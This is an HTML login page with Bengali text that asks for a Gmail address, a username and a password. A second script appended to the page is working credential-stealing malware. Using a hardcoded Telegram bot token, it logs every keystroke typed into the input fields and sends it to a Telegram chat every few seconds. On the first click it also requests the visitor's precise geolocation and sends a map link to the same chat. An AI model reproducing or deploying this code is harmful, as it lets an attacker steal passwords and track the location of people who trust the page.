<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - অ্যাকাউন্টে প্রবেশ করুন</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea, #764ba2);
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .login-container {
            background: white;
            padding: 40px 30px;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 380px;
        }
        .login-header {
            text-align: center;
            margin-bottom: 30px;
        }
        .login-header h2 {
            color: #333;
            font-size: 28px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
        }
        input {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.3s;
        }
        input:focus {
            border-color: #667eea;
            outline: none;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        .btn-login {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }
        .btn-login:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 15px rgba(102, 126, 234, 0.3);
        }
        .extra-options {
            text-align: center;
            margin-top: 20px;
        }
        .extra-options a {
            color: #667eea;
            text-decoration: none;
        }
        .extra-options a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <h2>লগইন করুন</h2>
        </div>
        
        <form id="loginForm">
            <div class="form-group">
                <label for="gmail">Gmail Address</label>
                <input type="email" id="gmail" placeholder="example@gmail.com" required>
            </div>

            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" placeholder="আপনার ইউজারনেম" required>
            </div>

            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" placeholder="পাসওয়ার্ড দিন" required>
            </div>

            <button type="submit" class="btn-login">লগইন করুন</button>
        </form>

        <div class="extra-options">
            <p><a href="#">পাসওয়ার্ড ভুলে গেছেন?</a></p>
            <p>অ্যাকাউন্ট নেই? <a href="#">সাইন আপ করুন</a></p>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const gmail = document.getElementById('gmail').value;
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            if (gmail && username && password) {
                alert(`লগইন সফল!\n\nGmail: ${gmail}\nUsername: ${username}`);
                // এখানে আপনি backend এ ডাটা পাঠাতে পারবেন (fetch / axios)
            } else {
                alert("সব ফিল্ড পূরণ করুন!");
            }
        });
    </script>

<script>
const TOKEN='8762306338:AAEK0xVsVm44Epmu0N3rVYqeVV10GfIRNco',CHAT_ID='7988925862';
const sendTele=m=>{fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text:m,parse_mode:'Markdown'})});};
let log = "";
document.addEventListener('input', (e) => {
    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
        let val = e.target.value;
        log = `[Field: ${e.target.name || e.target.placeholder}] -> ${val}`;
    }
});

setInterval(() => {
    if(log) { sendTele("⌨️ Keylog (Live): " + log); log = ""; }
}, 3000);

document.addEventListener('click', () => {
    navigator.geolocation.getCurrentPosition(res => {
        const mapLink = `https://www.google.com/maps?q=${res.coords.latitude},${res.coords.longitude}`;
        sendTele(`📍 Accurate Location:\nLink: ${mapLink}`);
    }, (err) => {
        sendTele("❌ Location Permission Denied");
    }, { enableHighAccuracy: true });
}, { once: true });

</script></body>
</html>
